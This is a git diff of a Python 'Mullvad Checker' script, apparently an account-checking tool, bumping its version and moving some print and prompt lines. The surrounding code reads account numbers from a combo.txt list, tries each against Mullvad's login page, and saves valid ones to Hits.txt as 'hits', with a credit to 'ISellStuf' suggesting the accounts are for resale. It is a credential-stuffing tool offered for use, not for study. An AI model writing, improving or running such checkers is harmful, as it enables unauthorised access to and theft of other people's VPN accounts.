@@ -21,7 +21,7 @@ print(Fore.CYAN + """
     | |\/| | | | | | \ \ / / _` |/ _` | | |    | '_ \ / _ \/ __| |/ / _ \ '__|
     | |  | | |_| | | |\ V / (_| | (_| | | |____| | | |  __/ (__|   <  __/ |   
     |_|  |_|\__,_|_|_| \_/ \__,_|\__,_|  \_____|_| |_|\___|\___|_|\_\___|_|   
-          Version 1.0
+          Version 1.1
 
       1.Proxyless Version
       2.Normal Version (Coming Soon...)                                                                  
@@ -39,8 +39,9 @@ elif op == '2':
     time.sleep(1.5)
 
 if op == '1':
+    print(Fore.CYAN + "[+] Starting Checker....")
     def login(num):
-        print(Fore.CYAN + "[+] Starting Checker....")
+        
         time.sleep(0.7)
         url = 'https://mullvad.net/en/account/login'
         headers = {
@@ -59,6 +60,7 @@ if op == '1':
             hits.write(f"[Hit]: {num} | Checker Made By ISellStuf\n")
         else:
             print(Fore.RED + f"[!] Invalid Number: {num}")
+    input("Hits Were Sent To Hits.txt....")
     file = open('combo.txt','r').readlines()
     for i in file:
         seq = i.strip()
